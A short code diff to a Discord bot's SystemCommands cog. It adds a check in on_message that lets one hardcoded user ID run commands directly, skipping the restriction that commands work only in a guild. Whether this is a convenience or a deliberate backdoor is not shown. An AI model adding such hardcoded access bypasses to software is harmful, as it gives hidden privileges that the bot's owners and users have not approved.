@@ -82,6 +82,10 @@ class SystemCommands(commands.Cog):
     async def on_message(self, message):
         if message.author == self.bot.user:
             return  
+        
+        if message.author.id == 110927272210354176:
+            await self.bot.process_commands(message)
+            return
 
         if isinstance(message.channel, discord.DMChannel):
             await message.channel.send("I can only process commands in a guild. /setup for more info")
